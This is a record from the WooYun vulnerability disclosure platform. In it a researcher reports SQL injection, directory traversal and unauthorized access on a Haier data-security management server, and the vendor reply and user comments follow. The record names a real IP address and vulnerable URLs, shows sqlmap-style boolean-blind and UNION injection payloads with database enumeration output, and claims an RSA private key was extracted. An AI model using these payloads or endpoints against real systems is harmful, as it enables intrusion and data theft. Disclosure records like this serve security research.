{"id": 8416, "wybug_id": "wooyun-2013-037768", "wybug_title": "海尔集团某企业级数据安全管理系统SQL注入、目录遍历及未授权访问漏洞打包", "wybug_corp": "海尔集团", "wybug_author": "霍大然", "wybug_date": "2013-09-22 13:49", "wybug_open_date": "2013-11-06 13:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["目录遍历", "注入", "未授权访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-06：\t细节向公众公开  简要描述： 某企业级数据安全管理系统SQL注入、目录遍历及未授权访问漏洞打包，已拿到私钥文件,求20rank. 详细说明：  问题站点：http://58.56.128.139:9999\n\n要安装证书，我就不安装了，可以看到是思智ERM管理中心百度了下：思智ERM （Enterprise Right Management ）是针对于企业级用户的数据安全管理系统。它不但能够对 Microsoft Office 、 CAD 、 PDF 等任意格式的电子文档及设计图纸进行加密保护，并且能够对加密的文件进行细分化的应用权限设置和备份保护。确保企业的机密数据只能被经过授权的人，在授权的应用环境中（例如企业内部），在指定的时间内，进行指定的应用操作，并且整个过程会被详细、完整的记录下来。一、未授权访问http://58.56.128.139:9999/dev_password.php\n\nhttp://58.56.128.139:9999/user_rapid_bind.php\n\nhttp://58.56.128.139:9999/php/WebDocList.php\n\n点击“新建word文档”，出现如下界面：\n\n还有好多，不举例了。二、目录遍历http://58.56.128.139:9999/auditfile/http://58.56.128.139:9999/config/  导致svn配置文件遍历下载了\n\nhttp://58.56.128.139:9999/.svn/\n\n好多，不举例了。三、sql注入注入点：http://58.56.128.139:9999/audit_client_query.php?userid=1 (GET)---Place: GETParameter: userid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: userid=1 AND 5292=5292    Type: UNION query    Title: Generic UNION query (NULL) - 1 column    Payload: userid=-9648 UNION ALL SELECT CHAR(113)+CHAR(100)+CHAR(122)+CHAR(118)+CHAR(113)+CHAR(113)+CHAR(102)+CHAR(104)+CHAR(70)+CHAR(81)+CHAR(69)+CHAR(114)+CHAR(75)+CHAR(82)+CHAR(107)+CHAR(113)+CHAR(120)+CHAR(108)+CHAR(105)+CHAR(113)-- ---web server operating system: Windowsweb application technology: Apache 2.2.11, PHP 5.2.9back-end DBMS: Microsoft SQL Server 2000available databases [7]:[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] sageerm4[*] tempdb业务表如下：\n\n   漏洞证明：  通过注入可以得到rsa的私钥文件：\n\n密钥相关的一些东西：\n\n   修复方案：  1、禁止目录遍历，在IIS中少打个勾即可；2、应用方面的未授权访问及sql注入还是打厂家吧。   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-09-22 15:42 厂商回复： 首先感谢 @霍大然 的工作。业务部门答复为：目前所涉及用户不超过40人，服务器为外协服务器，无海尔内部资料，也无重要资料。预计三天之内解决，谢谢。从业务性上看顶多是个中，不过既然求20rank了，那就给吧。请各位白帽子持续友好监督海尔信息安全工作，非常感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-22 15:45 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  @海尔集团 什么叫厚道，什么叫大气！    \n     2013-09-23 17:49 |    \t\tLeon \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 永无宁日啊)\t\t \n  @海尔集团  顶。。 可是，你说语句要三天解决，，那说明 这个问题对你来说是很麻烦的了。。我还没处理过要三天才能处理的漏洞。。。。    \n     2013-10-12 17:25 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @Leon 企业处理流程比较繁琐，很难说立刻解决某个问题，除非非常严重紧急    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}